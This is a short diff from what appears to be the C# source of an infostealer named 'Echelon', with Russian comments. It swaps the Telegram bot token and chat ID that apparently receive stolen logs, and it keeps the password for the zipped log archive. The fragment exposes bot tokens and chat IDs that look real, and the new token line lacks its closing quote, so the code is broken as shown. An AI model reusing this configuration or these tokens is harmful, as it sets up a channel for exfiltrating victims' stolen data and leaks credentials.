@@ -15,10 +15,10 @@ namespace Echelon
     class Program
     {
         //Токен бота в телеге можно создать бота и получить токен тут: @BotFather
-        public static string Token = "1230613231:AAHIU00xkjLD5gh2R3Dwt4ug4zoutlcng_U";
+        public static string Token = "1346101406:AAFTVVa15ouoJiNpav6hGZU37EOy3ZJsWuw;
 
         // Telegram ID чата, можно узнать тут: @my_id_bot
-        public static string ID = "844300569";
+        public static string ID = "84327968";
 
         // Пароль для архива с логом:
         public static string passwordzip = "Echelon";
